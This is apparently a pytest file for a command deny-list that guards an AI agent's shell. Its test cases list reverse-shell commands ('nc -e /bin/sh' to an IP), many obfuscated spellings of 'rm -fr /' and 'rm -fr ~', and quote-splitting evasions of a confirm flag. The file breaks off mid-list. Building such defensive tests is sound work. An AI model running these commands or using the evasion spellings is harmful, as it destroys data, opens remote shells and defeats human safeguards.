"""Tests for single catalog rows: a refusal's note, a row's identity and its shape.

An operator note decorates a refusal without changing the verdict, the self-protection floor
is a union with the regex tier rather than a replacement, a rule's identity is its id,
``reverse-shell-nc`` matches the ``nc`` command token, the dev-mode confirm flag stays out
of an agent shell's reach, and the recursive-force ``rm`` floor refuses a wipe of root or home
in its common spellings while descendants stay allowed.
"""

from __future__ import annotations

import pytest
from denied_commands_security_helpers import _own_address_probe_stays_local  # noqa: F401
from denied_commands_security_helpers import (
    _HYPH,
    _K,
    _KA,
    _NAME,
    _PK,
    _RULE_KILL,
    _RULE_MINT,
    _TOK,
    _denied_by,
    _rule_pattern,
)

from kiro_crew import security
from kiro_crew.security import BUILTIN_DENIED_RULES, BUILTIN_DENY_PATTERNS
from kiro_crew.security import argv_floor as _argv_floor
from kiro_crew.security import compute_effective_denied, is_denied, is_safe_user_regex

# Each test starts with the macOS libc and libproc handle caches unbuilt and puts them
# back after, as every test of the test_denied_commands_security family does (see conftest.py).
pytestmark = pytest.mark.usefixtures("fresh_darwin_libc_handles")


class TestDeniedReasonNotes:
    """``reason_notes`` decorates a refusal; it can never change the verdict.

    The note lands on a SECOND line because the first line is a machine-parsed
    contract on both sides: ``RecoveryCard.tsx`` extracts the pattern with a
    per-line, end-anchored regex, and the shared ``_denied_by`` helper partitions on the
    exact ``"Blocked by security policy: "`` separator. Anything appended to the
    same line would be captured as part of the pattern.
    """

    _USER_PATTERN = r"frobnicate.*"
    _CMD = "frobnicate the box"
    _NOTE = "use --dry-run instead"

    def _plain(self):
        return is_denied(self._CMD, denied_regexes=[self._USER_PATTERN])

    def _annotated(self, note=None):
        return is_denied(
            self._CMD,
            denied_regexes=[self._USER_PATTERN],
            reason_notes={self._USER_PATTERN: self._NOTE if note is None else note},
        )

    def test_first_line_is_byte_identical_to_the_unannotated_form(self):
        plain = self._plain()
        annotated = self._annotated()
        assert plain == f"Blocked by security policy: {self._USER_PATTERN}"
        assert annotated.splitlines()[0] == plain
        assert annotated == f"{plain}\n{self._NOTE}"
        assert annotated.count("\n") == 1  # exactly two lines, no trailing newline

    def test_reason_notes_none_reproduces_todays_exact_string(self):
        assert (
            is_denied(self._CMD, denied_regexes=[self._USER_PATTERN], reason_notes=None)
            == self._plain()
        )

    def test_empty_map_reproduces_todays_exact_string(self):
        assert (
            is_denied(self._CMD, denied_regexes=[self._USER_PATTERN], reason_notes={})
            == self._plain()
        )

    def test_pattern_with_no_note_of_its_own_is_unchanged(self):
        # A note for a DIFFERENT pattern must not leak onto this refusal — the
        # lookup is keyed, not "any note in the map".
        assert (
            is_denied(
                self._CMD,
                denied_regexes=[self._USER_PATTERN],
                reason_notes={"some-other-pattern": "unrelated"},
            )
            == self._plain()
        )

    @pytest.mark.parametrize("blank", ["", "   ", "\t", "\n"])
    def test_blank_note_adds_no_second_line(self, blank):
        # ``_reason`` strips before deciding, so a blank note cannot append an
        # empty line the reader would have to skip.
        assert self._annotated(blank) == self._plain()

    def test_note_never_changes_whether_something_matches(self):
        # Denied stays denied; allowed stays allowed. A note is presentation
        # only, so it can neither create nor suppress a match.
        assert self._annotated() is not None
        allowed = is_denied(
            "echo hello",
            denied_regexes=[self._USER_PATTERN],
            reason_notes={self._USER_PATTERN: self._NOTE, "echo.*": "would match if notes matched"},
        )
        assert allowed is None
        # And a note attached to a pattern that is NOT in the effective set
        # cannot re-admit that pattern as a rule.
        assert (
            is_denied("echo hello", denied_regexes=[], reason_notes={"echo.*": "not a rule"})
            is None
        )

    def test_note_does_not_change_which_pattern_matched(self):
        # Two rules, note on the one that does NOT match: the reported pattern is
        # still the matching one, un-annotated.
        reason = is_denied(
            self._CMD,
            denied_regexes=["never-matches-this", self._USER_PATTERN],
            reason_notes={"never-matches-this": "wrong rule"},
        )
        assert reason == self._plain()

    def test_denied_by_resolves_the_rule_id_with_a_note_present(self):
        # THE regression guard for ``_denied_by``: a note appended to the matched
        # rule's refusal must not break rule-id resolution. Naively partitioning
        # the WHOLE verdict yields "<pattern>\n<note>", which is in no lookup
        # table, so every id-based assertion of the suite would silently degrade
        # to "<unmapped:...>". Parsing the first line keeps the id recoverable.
        cmd = "aws ec2 terminate-instances --instance-ids i-1"
        expected_id = _denied_by(cmd)
        assert expected_id == "aws-destructive-ec2-terminate-instances"
        pattern = _rule_pattern(expected_id)
        annotated = {pattern: "open a ticket first"}
        # Same id, even though the refusal now carries a second line.
        assert _denied_by(cmd, annotated) == expected_id
        verdict = is_denied(cmd, reason_notes=annotated)
        assert verdict.splitlines() == [
            f"Blocked by security policy: {pattern}",
            "open a ticket first",
        ]
        # A note on an unrelated pattern leaves the id resolution untouched too.
        assert _denied_by(cmd, {"unrelated-pattern": "ignore me"}) == expected_id

    def test_builtin_refusals_are_single_line_by_default(self):
        # Nothing annotates built-ins unless a caller passes a map, so the
        # historical single-line shape is preserved for the whole catalog path.
        assert "\n" not in is_denied("aws ec2 terminate-instances --instance-ids i-1")


class TestSelfProtectionFloorIsAdditive:
    """The floor must be a UNION with the regex tier, never a replacement.

    Two independent failure modes are guarded here, both of which produce the
    same outcome -- a self-protection rule that reports as present while
    enforcing nothing:

    * **Fail-open on tokenizer failure.** The floor tokenizes with ``shlex``,
      which can raise (unbalanced quotes, or a platform bug). If the floor had
      REPLACED the regex, that exception would allow the command.
    * **Nested shell payloads.** ``bash -c "<script>"`` hands the whole script
      to the tokenizer as one opaque argument. The payload is re-tokenized to
      close this, but the raw-text pattern is the backstop if that ever regresses.
    """

    def test_floor_patterns_stay_in_the_effective_regex_list(self):
        # The regression this guards is exactly what shipped in the first
        # revision of this rework: patterns filtered OUT of the regex tier.
        effective = compute_effective_denied(BUILTIN_DENIED_RULES, (), False, (), ())
        for rule_id in (_RULE_KILL, _RULE_MINT):
            assert _rule_pattern(rule_id) in effective, rule_id

    @pytest.mark.parametrize("rule_id", [_RULE_KILL, _RULE_MINT])
    def test_retained_pattern_is_a_subset_of_its_predicate(self, rule_id):
        """The catalog-visible pattern must never claim more than the floor.

        The pattern is what the posture UI shows and what a future editor will
        read. If the pattern matched something the predicate does not, the two
        would have drifted and the displayed text would be a lie. Every command
        the pattern denies must also be denied by the floor predicate.
        """
        import re as _re

        from kiro_crew.security import _is_credential_mint, _is_self_kill

        predicate = _is_self_kill if rule_id == _RULE_KILL else _is_credential_mint
        rx = _re.compile(_rule_pattern(rule_id), _re.IGNORECASE)
        corpus = [
            f"{_PK} -f {_NAME}",
            f"{_KA} {_NAME}",
            f"sudo {_KA} -9 {_NAME}",
            f"{_PK} -f /usr/local/bin/{_NAME}",
            f"{_K} $(pgrep -f {_NAME})",
            f"{_K} $(pidof {_NAME})",
            f"{_K} `pgrep {_NAME}`",
            f"{_NAME} {_TOK}",
            f"{_NAME} pod {_TOK} wt",
            f"{_HYPH} {_TOK}",
            f"./bin/{_NAME} {_TOK}",
            f"{_NAME} -v --no-jail {_TOK}",
        ]
        for cmd in corpus:
            if rx.search(cmd.lower()):
                assert predicate(cmd.lower()), f"pattern matched but predicate did not: {cmd}"

    def test_tokenizer_failure_does_not_allow_a_mint(self, monkeypatch):
        # Simulate the floor's tokenizer failing outright.  The command must
        # still be denied, by the regex half of the union.
        import kiro_crew.security as sec

        def _boom(_cmd):
            raise ValueError("simulated tokenizer failure")

        monkeypatch.setattr(sec, "normalize_shell_command", _boom)
        assert _denied_by(f"{_NAME} {_TOK}") == _RULE_MINT
        assert _denied_by(f"{_PK} -f {_NAME}") == _RULE_KILL

    def test_home_expansion_tolerates_a_backslash_home(self, monkeypatch):
        """A Windows home (``C:\\Users\\x``) must not break tokenization.

        ``re.sub`` parses a str replacement as a TEMPLATE, and ``\\U`` is an
        invalid escape -- so using the home path as a string replacement raised
        ``re.error`` for EVERY input on Windows, silently emptying the token list
        and disabling the floor (and the git-push quote-evasion pass) there.
        """
        import os as _os

        from kiro_crew.security import normalize_shell_command

        monkeypatch.setattr(_os.path, "expanduser", lambda _p: r"C:\Users\runneradmin")
        # The guard is that this RETURNS rather than raising.
        assert normalize_shell_command(f"{_PK} {_NAME}") == [_PK, _NAME]
        # $HOME expansion now happens AFTER shlex tokenization, so the Windows
        # home path backslashes are preserved (not eaten by shlex).
        expanded = normalize_shell_command("ls $HOME/x")
        assert expanded[0] == "ls"
        assert r"C:\Users\runneradmin" in expanded[1] or "C:\\Users\\runneradmin" in expanded[1]


class TestRuleIdentityIsTheId:
    """A rule's IDENTITY is its ``id``; the pattern is payload, not a key.

    This is what makes it safe to change a built-in pattern: user opt-outs
    (``disabled_ids``) and un-weakenable governance pins are both resolved against
    ``rule.id``, so editing a pattern cannot make a pin or an opt-out miss and
    silently flip a rule's enabled state.  Both rules keep the ids they shipped with.
    """

    def test_the_two_rule_ids_are_unchanged(self):
        ids = {r.id for r in BUILTIN_DENIED_RULES}
        assert _RULE_MINT in ids
        assert _RULE_KILL in ids

    def test_a_governance_pin_resolves_by_id_not_pattern(self):
        rule = next(r for r in BUILTIN_DENIED_RULES if r.id == _RULE_MINT)
        # Pinned by ID, the rule survives even a blanket user disable.
        assert compute_effective_denied([rule], {rule.id}, True, (), {rule.id}) == [rule.pattern]

    def test_a_pattern_string_is_never_an_identity(self):
        rule = next(r for r in BUILTIN_DENIED_RULES if r.id == _RULE_KILL)
        # Passing the PATTERN where an id belongs disables nothing, which is precisely
        # why a pattern edit cannot weaken an existing policy.
        assert compute_effective_denied([rule], {rule.pattern}, False, (), ()) == [rule.pattern]


class TestReverseShellNcIsCommandTokenAnchored:
    """``reverse-shell-nc`` matches the ``nc`` COMMAND TOKEN, not a substring.

    An unanchored substring ``nc -e`` matches inside ``rsync -e ssh``: every
    rsync-over-ssh transfer with a detached remote-shell flag, and every
    read-only command that merely quotes the phrase, then reads as a netcat
    reverse shell.  The row therefore requires ``nc`` to BEGIN a token -- start
    of input, whitespace, a path separator, a quote or a shell operator before
    it -- so the tail of another token (``rsync``, ``vnc``) is not a match,
    while every genuine invocation the bare substring refuses is refused here
    too.  The sibling ``reverse-shell-ncat`` row keeps its own spelling: each
    row governs exactly the spelling its toggle names, the same per-row
    attribution the always-on exfil gate enforces (``test_exfil_gate_opt_out``).
    """

    _RULE = "reverse-shell-nc"
    _SIBLING = "reverse-shell-ncat"

    @pytest.fixture(autouse=True)
    # nosemgrep: kirocrew.test-autouse-shared-monkeypatch -- pre-existing class-local autouse stub, moved verbatim; de-flake pass tracked
    def _remote_rsync_targets_are_not_this_host(self, monkeypatch):
        # The rsync allow cases name a REMOTE host, which the sandbox-escape floor
        # judges by resolving it, fail-closed while unresolved.  Pin the own-host
        # cache and stub the DNS verdict to "not self" exactly as
        # ``TestSandboxEscapeSshSelf`` does (its fixture says why each slot), so
        # nothing is resolved for real and the verdict here is this row's alone.
        own = security.socket.gethostname().strip().lower()
        pinned = frozenset(name for name in {own, own.split(".", 1)[0]} if name)
        monkeypatch.setattr(_argv_floor, "_OWN_HOST_NAMES_CACHE", pinned)
        monkeypatch.setattr(_argv_floor, "_OWN_HOST_RESOLVE_DONE", True)
        monkeypatch.setattr(_argv_floor, "_NETLINK_ADDRS_PUBLISHED", True)
        monkeypatch.setattr(_argv_floor, "_resolved_host_verdict", lambda host, **_kw: False)

    @staticmethod
    def _effective_without(*rule_ids: str) -> list[str]:
        return compute_effective_denied(BUILTIN_DENIED_RULES, set(rule_ids), False, (), ())

    @pytest.mark.parametrize(
        "cmd",
        [
            # bare, and the reporter's own acceptance example
            "nc -e /bin/sh 10.0.0.1 4444",
            # the flag glued to its program, as getopt accepts it
            "nc -e/bin/sh 10.0.0.1 4444",
            "nc -esh 10.0.0.1 4444",
            # padded whitespace between the verb and the flag
            "nc  -e /bin/sh 10.0.0.1 4444",
            "nc\t-e /bin/sh 10.0.0.1 4444",
            # path-qualified
            "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
            "/bin/nc -e /bin/sh 10.0.0.1 4444",
            "./nc -e /bin/sh 10.0.0.1 4444",
            # alias-bypass backslash
            "\\nc -e /bin/sh 10.0.0.1 4444",
            # a lone ``=`` before the verb is not an assignment prefix
            "=nc -e /bin/sh 10.0.0.1 4444",
            # ``:`` glued to the verb is not a boundary: the Windows drive-relative
            # spelling, and any other ``:``-glued prefix (no legitimate command
            # takes that form, so this is fail-safe over-denial)
            "C:nc -e /bin/sh 10.0.0.1 4444",
            "scheme:nc -e /bin/sh 10.0.0.1 4444",
            # after every shell separator, spaced and glued
            "true; nc -e /bin/sh 10.0.0.1 4444",
            "true;nc -e /bin/sh 10.0.0.1 4444",
            "true && nc -e /bin/sh 10.0.0.1 4444",
            "true&&nc -e /bin/sh 10.0.0.1 4444",
            "false || nc -e /bin/sh 10.0.0.1 4444",
            "false||nc -e /bin/sh 10.0.0.1 4444",
            "echo x | nc -e /bin/sh 10.0.0.1 4444",
            "echo x|nc -e /bin/sh 10.0.0.1 4444",
            "(nc -e /bin/sh 10.0.0.1 4444)",
            "x=$(nc -e /bin/sh 10.0.0.1 4444)",
            "x=`nc -e /bin/sh 10.0.0.1 4444`",
            # after a wrapper
            "sudo nc -e /bin/sh 10.0.0.1 4444",
            "env FOO=bar nc -e /bin/sh 10.0.0.1 4444",
            "busybox nc -e /bin/sh 10.0.0.1 4444",
            "nohup nc -e /bin/sh 10.0.0.1 4444 &",
            "timeout 30 nc -e /bin/sh 10.0.0.1 4444",
            # inside a nested shell payload, both quote styles
            "bash -c 'nc -e /bin/sh 10.0.0.1 4444'",
            'sh -c "nc -e /bin/sh 10.0.0.1 4444"',
            # a re-quoted verb reaches the row through the quote-normalized view
            '"nc" -e /bin/sh 10.0.0.1 4444',
            # case is folded before matching
            "NC -E /bin/sh 10.0.0.1 4444",
        ],
    )
    def test_a_genuine_netcat_exec_is_denied_by_this_row(self, cmd):
        assert _denied_by(cmd) == self._RULE, cmd

    @pytest.mark.parametrize(
        "cmd",
        [
            # the reporter's transfer, and the plain detached remote-shell flag
            (
                'rsync -e "ssh -F /dev/null -o BatchMode=yes user@far.example.com" '
                "./file far.example.com:/path"
            ),
            "rsync -e ssh user@far.example.com:/remote/path /local/path",
            "rsync -avz -e 'ssh -p 2222' src/ far.example.com:/dst/",
            # another program whose name ends in the same two letters
            "vnc -e /etc/vnc.conf",
            # a file name ending in the letters, with a flag after it; the second
            # reaches ``nc -exec`` once pass 2 normalizes the quotes away
            "python train.py dataset.nc -e 50",
            "find . -name '*.nc' -exec grep -l x {} +",
            # an assignment prefix glued to the verb
            "NAME=nc -e /bin/sh 10.0.0.1 4444",
            # ``-nc`` as another program's flag, followed by its own ``-e``
            "wget -r -nc -e robots=off https://example.com",
            "rsync -nc -e ssh src host:/dst",
            # the phrase as DATA: a read-only search for it, and a message naming it
            "grep -rn 'rsync -e' docs/",
            "git log --oneline --grep='rsync -e'",
            "git commit -m 'docs: prefer rsync -e ssh over --rsh'",
        ],
    )
    def test_the_substring_inside_another_token_is_not_a_reverse_shell(self, cmd):
        assert _denied_by(cmd) is None, cmd

    def test_each_row_governs_exactly_its_own_spelling(self):
        # Mirrors the exfil gate's per-row attribution at the catalog tier: the
        # anchored ``nc`` row must not shadow ``ncat``, or switching the sibling
        # off would read as enabled-and-off while enforcement never changed.
        nc_cmd = "nc -e /bin/sh 10.0.0.1 4444"
        ncat_cmd = "ncat -e /bin/sh 10.0.0.1 4444"
        assert _denied_by(ncat_cmd) == self._SIBLING
        assert is_denied(nc_cmd, denied_regexes=self._effective_without(self._RULE)) is None
        assert is_denied(ncat_cmd, denied_regexes=self._effective_without(self._SIBLING)) is None
        assert is_denied(ncat_cmd, denied_regexes=self._effective_without(self._RULE))
        assert is_denied(nc_cmd, denied_regexes=self._effective_without(self._SIBLING))

    def test_the_row_runs_on_the_full_input_matcher(self):
        # No top-level ``.*`` gap, so the row is one fragment matched with exact
        # ``re.search`` over the WHOLE command, never the length-capped scan --
        # a padded command cannot slip the needle past a bound.
        from kiro_crew.security import _deny_matcher

        pattern = _rule_pattern(self._RULE)
        assert is_safe_user_regex(pattern)
        matcher = _deny_matcher(pattern)
        assert not matcher._bounded
        assert len(matcher._frag_res) == 1

    def test_a_governance_pin_in_the_prior_spelling_still_pins_the_row(self):
        # A governance policy persists the pattern STRING it pinned.  A ceiling or
        # profile written against the older catalog holds the bare substring, and
        # a pin that stopped resolving would let a user opt-out drop the row the
        # administrator pinned -- the legacy alias is what keeps it resolving.
        legacy = "nc -e" + ".*"
        assert security._rule_id_for_pattern(legacy) == self._RULE
        assert security._resolved_pin_ids([legacy], "commands-ceiling-pin") == {self._RULE}
        # The pinned id re-adds the row past a user disable AND a disable-all,
        # exactly as a pin in the current spelling does.
        rule = next(r for r in BUILTIN_DENIED_RULES if r.id == self._RULE)
        pinned = compute_effective_denied([rule], {rule.id}, True, (), {self._RULE})
        assert pinned == [rule.pattern]
        # Lookup-only: the prior spelling is not a built-in and is never enforced.
        assert legacy not in BUILTIN_DENY_PATTERNS
        assert legacy not in security._RULE_ID_BY_PATTERN


class TestDevModeConfirmFlagIsAgentInaccessible:
    """`--confirm-out-of-install-root` must be unreachable from an agent shell.

    The flag is the operator's explicit attestation for granting app dev mode
    on a UI root OUTSIDE the app's install directory, and the grant
    relaxes the unauthenticated UI route's root containment. Without this rule
    an auto-approved Bash tool could pass the flag itself and convert shell
    access into a self-granted serving grant on an arbitrary host directory —
    the exact self-grant path the confirmation gate exists to close. Two tiers
    enforce it: the catalog rule matches the flag's literal text (direct form,
    nested shell payloads, quoted interpreter argv), and the paired argv floor
    (``_is_dev_mode_out_of_root_confirm``) re-checks the DE-ESCAPED text and
    tokenized argv, because quote-splitting inside the token
    (``--confirm-out-of-install-'root'``) reaches argparse as the accepted
    flag while the raw text never carries the literal.
    """

    def test_the_flag_is_denied_in_direct_and_nested_forms(self):
        from kiro_crew import security

        for cmd in (
            "kirocrew app dev my-app --confirm-out-of-install-root",
            'bash -c "kirocrew app dev my-app --confirm-out-of-install-root"',
            'python3 -c "import subprocess; subprocess.run('
            "['kirocrew','app','dev','x','--confirm-out-of-install-root'])\"",
        ):
            assert security.is_denied(cmd) is not None, f"not denied: {cmd!r}"

    def test_dev_mode_confirm_flag_denied_under_quote_splitting(self):
        """Quoting splits the flag in RAW text but the shell strips it, so the
        de-quoted argv still carries the accepted flag -- the argv floor must
        deny every spelling the raw-text regex cannot see."""
        from kiro_crew import security

        for cmd in (
            "kirocrew app dev my-app --confirm-out-of-install-'root'",
            'kirocrew app dev my-app --confirm-out-of-install-"root"',
            'kirocrew app dev my-app "--confirm-out-of-install-root"',
            "kirocrew app dev my-app '--confirm-out-of-install-root'",
            'kirocrew app dev my-app --confirm-out-of-install-ro""ot',
            "kirocrew app dev my-app --confirm\\-out-of-install-root",
            "kirocrew app dev my-app --'confirm'-out-of-install-root",
            "bash -c \"kirocrew app dev my-app --confirm-out-of-install-'root'\"",
        ):
            assert security.is_denied(cmd) is not None, f"not denied: {cmd!r}"

    def test_ordinary_dev_toggles_stay_allowed(self):
        """The rule targets the attestation flag, not the dev-mode verb —
        in-install dev-mode toggles remain an ordinary agent operation."""
        from kiro_crew import security

        assert security.is_denied("kirocrew app dev my-app") is None
        assert security.is_denied("kirocrew app dev my-app --off") is None


class TestRecursiveForceRmFloor:
    """The rm seatbelt: recursive + force against root or home itself."""

    @pytest.mark.parametrize(
        "command",
        [
            "RM -fr /",
            "RM -r -f /",
            "RM -Rf /",
            "RM --recursive --force /",
            "RM -rf --no-preserve-root /",
            "RM / -rf",
            "RM -fr -- /",
            "RM -fr /*",
            "RM -fr '/'",
            "/bin/RM -fr /",
            "RM -fr ~",
            "RM -fr ~/",
            "RM -fr ~/*",
            "RM -rf $HOME",
            "RM -rf ${HOME}",
            'RM -rf "$HOME"',
            'RM -rf "${HOME}/"',
            "X=1 RM -fr ~",
            "cd /tmp && RM -fr ~",
            "# clean up\nRM -fr ~",
            "# don't keep old files\nRM -fr ~",
            'echo "$(RM -fr ~)"',
            "echo $(RM -fr /)",
            'echo "`RM -fr ~`"',
            'echo "done: `RM -fr /`"',
            "RM -fr />/dev/null",
            "RM -fr ~>/dev/null",
            "RM -fr / 2>/dev/null",
            "RM -fr ~</dev/null",
            # A redirection (and any assignment) before the program runs first; a
            # leading redirection must be stepped over whole -- an fd number
            # (``2>``), a ``{fd}``, a two-character operator (``>>``), an fd-dup
            # (``2>&1``) and a spaced target all included -- so the real program
            # word is still RM and the wipe is not hidden behind the redirection.
            "2>/dev/null RM -r -f /",
            "X=1 2>x RM -r -f ~",
            ">> x RM -r -f /",
            "2>&1 RM -r -f ~",
            "2>/dev/null RM --recursive --force ~",
            "{fd}>x RM -rf /",
            # A redirection (and any assignment) before the program runs first; the
            # program word is still RM, so a leading redirect must not hide the wipe.
            "X=1>/dev/null RM -fr /",
            "X=1>/dev/null RM -fr ~",
            "A=1<x RM -fr ~",
            ">/dev/null RM -fr /",
            "2>&1 RM -rf ~",
            "> /dev/null RM -fr /",
            "X=1 Y=2 >log RM -rf /",
            "&>/dev/null RM -fr /",
            # A reserved word or ``!`` / ``time`` leaves the next word the program.
            "if :; then RM -fr ~; fi",
            "if false; then :; else RM -fr ~; fi",
            "for i in 1; do RM -fr ~; done",
            "while :; do RM -fr /; done",
            "{ RM -fr ~; }",
            "! RM -fr ~",
            "time RM -fr ~",
            "time -p RM -fr /",
            "! time RM -fr ~",
            "case x in x) RM -fr /;; esac",
            "echo ${x:-$(RM -fr ~)}",
            # A substitution in command position may expand to nothing.
            "$(true)RM -fr ~",
            "$(true) RM -fr ~",
            "echo hi | `true`RM -fr /",
            '"$(true)"RM -fr ~',
            # An unquoted backtick still cuts the argv, as on base.
            "RM -fr ~/`true`",
            # A leading redirection keeps its substitution target.
            ">$(mktemp) RM -fr ~",
            '>"$(mktemp)" RM -fr ~',
            "2>`mktemp` RM -fr /",
            "<$(x) RM -fr ~",
            "2>$(printf /dev/null) RM -fr ~",
            # ``#`` and ``<<`` inside ``${…}`` / ``$[…]`` are data, not a comment or heredoc.
            "echo ${x:- #}; RM -fr /",
            "echo ${x:- <<EOF}; RM -fr /",
            "echo ${a[1]:- #}; RM -fr ~",
            "echo $[ 1 << 2 ]\nRM -fr /",
            "echo ${x:-[} # don't remove this marker\nRM -fr ~",
            # ``$$`` is the PID, so ``$${`` opens no expansion and the comment is skipped.
            "echo $${x:- # don't remove this marker\nRM -fr ~",
            "echo $${x:- #} don't\nRM -fr ~",
            # A comment inside a tracked ``${…}`` cannot quote away the wipe.
            "unset x; echo ${x:-$( # don't\nRM -fr ~\n# '\n)}",
            "unset x; echo ${x:-` # don't\nRM -fr ~\n# '\n`}",
            "echo ${x:-$( # it's\nRM -fr /\n# '\n)}",
            "echo $[ $( # don't\nRM -fr ~\n# '\n) ]",
            # An expansion that never closes is also read as if it were not there.
            "echo \\$${x # don't\nRM -fr ~",
            # An unset parameter in the program word expands to nothing.
            "${x}RM -fr ~",
            "$x RM -fr ~",
            '"${x}"RM -fr ~',
            "${x}${y}RM -fr /",
            "$1RM -fr ~",
        ],
    )
    def test_a_recursive_force_wipe_of_root_or_home_is_denied(self, command):
        assert is_denied(command.replace("RM", "rm")) is not None

    @pytest.mark.parametrize(
        "command",
        [
            "RM -fr /tmp/x",
            "RM -rf $HOME/.cache",
            "RM -rf ./build",
            "RM -f /",
            "RM -r /",
            "RM -r ~",
            "RM -r /tmp/x",
            "RM -fr $HOME_BACKUP",
            # A parameter glued to the program word that leaves no ``rm`` stays allowed.
            "${x}echo hi",
            "${x}RM -fr /tmp/x",
            "${x}RM -f ~",
            "$xrm -fr ~",
            "'${x}'RM -fr ~",
            "\\${x}RM -fr ~",
            "echo ${x}RM -fr ~",
            "echo RM -fr /",
            # Quoted text and heredoc bodies are data, not commands.
            'git commit -m "pin floor; RM -fr / and RM -fr ~ are refused"',
            'rg -n "RM -fr /|RM -fr ~" src/',
            "cat > /tmp/body.md <<'EOF'\nRM -fr / is refused\nEOF",
            "RM -rf dist build  # wipe artifacts / rebuild",
            "RM -rf '$HOME'",
            # The double quote resumes after a quoted substitution closes.
            'git commit -m "$(date +%F): pin floor; RM -fr / and RM -fr ~ are refused"',
            'echo "Cleaning $(pwd); RM -fr ~ is never run here"',
            'gh pr create --body "Built from $(git rev-parse HEAD)\nRM -fr ~ and RM -r -f /"',
            'printf "%s\\n" "$(printf example:) RM -fr ~"',
            'RM -fr "~/"',
            # A backtick body in double quotes is read, and the quote resumes after it.
            'echo "built at `date +%F`; RM -fr ~ is refused"',
            "echo 'single `RM -fr ~` quoted'",
            # A redirection target is its own word, never an rm operand.
            "RM -fr ./build>/",
            "RM -fr /tmp/x>/dev/null",
            # A leading redirect/assignment before a non-root/home wipe stays allowed.
            "X=1>/dev/null RM -rf ./build",
            "2>&1 RM -fr /tmp/x",
            "> /dev/null RM -rf $HOME/.cache",
            # A digit in a PATH is not an fd prefix, so the redirection target is
            # still a descendant, not the root operand.
            "RM -fr /tmp/2>/dev/null",
            ">> log RM -rf ./build",
            # A keyword as an argument, or a substitution operand, is not a root/home target.
            "echo then RM -fr ~",
            "RM -fr $(mktemp -d)",
            "echo ${a[1]} # RM -fr ~",
            "echo $((1 << 2)) # RM -fr ~",
            # A substitution inside a target is a real path: cache clears stay allowed.
            'RM -rf "$(pip cache dir)"/*',
            'RM -rf "$(go env GOCACHE)"/*',
            'cd build && RM -rf "$(pwd)"/*',
            'RM -rf "$HOME/$(basename "$PWD")"',
        ],
    )
    def test_descendants_and_partial_flags_stay_allowed(self, command):
        assert is_denied(command.replace("RM", "rm")) is None

    def test_nested_open_expansions_are_read_a_bounded_number_of_times(self, monkeypatch):
        """Twenty ``"$( ${`` levels cost a linear number of walks, not 2**20."""
        from kiro_crew.security import rm_floor

        calls = 0
        real = rm_floor._segments

        def _counted(*args, **kwargs):
            nonlocal calls
            calls += 1
            return real(*args, **kwargs)

        monkeypatch.setattr(rm_floor, "_segments", _counted)
        command = 'echo "$( ${ ' * 20 + "rm -fr /tmp/x" + ' )"' * 20
        rm_floor._rm_wipe_targets(command)
        assert calls <= 4 * 20 + 2

    def test_the_floor_reports_the_catalog_row(self):
        reason = is_denied("rm -fr /")
        assert reason is not None
        assert "local-destructive-rm-rf-root" in reason

    def test_a_disabled_row_disables_its_floor(self):
        only_home = ["rm -rf ~.*"]
        assert is_denied("rm -fr /", denied_regexes=only_home) is None
        assert is_denied("rm -fr ~", denied_regexes=only_home) is not None

    def test_a_floor_error_refuses_only_a_command_that_could_hold_rm(self, monkeypatch):
        from kiro_crew.security import rm_floor

        def _boom(_text):
            raise RuntimeError("walk failed")

        monkeypatch.setattr(rm_floor, "_rm_wipe_targets", _boom)
        assert "could not read" in is_denied("rm -fr /")
        assert "could not read" in is_denied("/bin/rm -fr /")
        assert "could not read" in is_denied("${X:-rm} -fr /")
        assert "could not read" in is_denied('"${X-rm}" -fr ~')
        assert is_denied("git status") is None
        assert is_denied("echo $PATH") is None

    @pytest.mark.parametrize(
        "command",
        [
            "git log --format=$x",
            "git log --format=%H -n 1",
            "make format",
            "docker run --rm alpine true",
            "python3 -m pip install --platform any $PKG",
        ],
    )
    def test_a_floor_error_lets_a_command_without_an_rm_word_pass(self, monkeypatch, command):
        """The letters r..m inside another word do not make a command one the floor reads."""
        from kiro_crew.security import rm_floor

        def _boom(_text):
            raise RuntimeError("walk failed")

        monkeypatch.setattr(rm_floor, "_rm_wipe_targets", _boom)
        assert is_denied(command) is None


class TestRmFloorReadsNestedShellPayloads:
    """The rm floor reads every nested-shell payload, and a redirect hides none of them."""

    @pytest.mark.parametrize(
        "command",
        [
            "bash -c 'RM -fr /'",
            "busybox sh -c 'RM -fr /'",
            'bash -c $" RM -fr ~"',
            'bash -c "RM -fr "$"~"',
            "bash -c 'cd x && RM -fr ~'",
            'bash -c "RM -fr \\$HOME"',
            # A redirect is no operand: bash runs the script after it.
            "bash -c 2>/dev/null 'RM -fr ~'",
            "sh -c >/tmp/o 'RM -fr /'",
            "sh -c > /tmp/o 'RM -fr /'",
            "bash -c 2>&1 -- 'RM -fr ~'",
            "eval bash -c 'RM -fr /'",  # the shell's own -c payload is still read
            "bash -c > eval 'RM -fr /'",  # a redirect target named eval is a file
            "bash -c 2> source 'RM -fr ~'",
            "bash -c 2>$(printf /dev/null) 'RM -fr ~'",  # a target spanning words
            "env -S 2>/dev/null 'RM -fr /'",
            # A quoted ``(`` is a file name; the target's end cannot be told, so fail closed.
            "bash -c 2>'(' 'RM -fr ~'",
            "bash -c 2>\\( 'RM -fr /'",
            "bash -c 2> $(printf /dev/null) 'RM -fr ~'",
            "bash -c 2>/dev/null 2>'(' 'RM -fr /'",
            "env -S 2>'(' 'RM -fr ~'",
            # An inert echo argument equal to a glued payload exempts nothing.
            "echo 'RM -r -f /' ; bash<<<'RM -r -f /'",
            "echo 'RM -r -f /' ; bash -c'RM -r -f /'",
            "source 'RM -fr ~' || bash<<<'RM -fr ~'",  # nor does a source argument
            "bash -c -c 2>/dev/null 'RM -fr ~'",  # a later -c carrier behind a redirect
            "echo benign\nbash -c 'RM -fr ~'",  # a newline ends the echo
            "echo hi # it's\nbash -c 'RM -fr ~'",  # a comment's quote opens nothing
            "bash -c 'RM -fr ~' # it's",  # nor on the payload's own line
            "echo hi # x \\\nbash -c 'RM -fr ~'",  # a comment's backslash continues nothing
            "bash -c 2> ';' 'RM -fr ~'",  # a quoted ``;`` target ends nothing
            # bash folds a backslash-newline in the payload it runs.
            "bash -c 'RM -fr \\\n~'",
            "RM -fr \\\n~",
            # A substitution body runs as its own command; its outer echo / cat exempts nothing.
            "echo $( bash -c 'RM -fr ~' )",
            "cat <( bash -c 'RM -fr ~' )",
            "cat >( bash -c 'RM -fr /' )",
            "echo `bash -c 'RM -fr ~'`",
            # A splice marker anywhere voids the echo exemption: fail closed.
